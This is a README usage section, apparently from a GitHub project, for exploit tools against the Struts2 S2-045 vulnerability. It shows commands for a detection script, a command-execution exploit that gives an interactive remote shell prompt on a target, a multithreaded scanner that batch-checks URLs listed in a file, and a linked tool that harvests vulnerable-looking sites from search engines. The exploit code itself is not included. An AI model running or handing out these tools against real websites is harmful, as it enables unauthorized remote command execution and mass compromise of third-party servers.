### Usage

#### 检测漏洞POC
python s2_045.py http://xxx.com/a.action

```bash
>python s2_045.py http://xxx.com/a.action
[Loopholes exist] http://xxx.com/a.action
```
#### 漏洞利用POC（cmd版）
python s2_045_cmd.py http://xxx.com/a.action

```bash
>python s2_045_cmd.py http://xxx.com/a.action
[Loopholes exist] http://xxx.com/a.action
[cmd]>>ls
......
```
#### 多线程批量检测脚本
python S2_045_thread.py（填写url.txt后运行）

```bash
填写url.txt文件，每行一个url地址(url中含.action/.do的地址)，运行完以后会生成一个result.txt文件存放存在漏洞的url
```

#### 利用搜索引擎批量检测脚本
想要采集网站中带.action/.do地址的，请看：[Search_S2_045](https://github.com/tengzhangchao/Struts2_045-Poc/tree/master/Search_S2_045)


更多请参考博客：[nMask](http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/)
